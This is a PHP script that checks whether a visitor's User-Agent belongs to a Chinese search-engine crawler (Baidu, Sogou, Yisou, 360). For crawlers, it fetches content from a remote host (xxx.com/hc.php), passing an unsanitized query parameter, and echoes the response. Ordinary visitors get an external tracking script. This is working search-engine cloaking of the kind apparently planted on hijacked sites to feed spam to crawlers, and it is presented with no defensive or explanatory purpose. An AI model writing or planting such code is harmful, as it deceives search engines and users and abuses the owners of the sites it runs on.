<?php
$ua=$_SERVER['HTTP_USER_AGENT'];
$ua=strtolower($ua);
if($ua!="" && strpos($ua,"baiduspider") || strpos($ua,"sogou.com") || strpos($ua,"yisouspider") || strpos($ua,"360"))
{


$filename = $_GET["xj"];


    
$url = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
echo '<link rel="canonical" href="'.$url.'" />' ;

$ch = curl_init();

$url = "http://xxx.com/hc.php?".$filename;

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)');
     
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);


curl_exec($ch);


curl_close($ch);

    exit;


} 
else
{
echo '<script charset="UTF-8" id="LA_COLLECT" src="https://xxx/tz.js?1"></script>
 ';}
?>
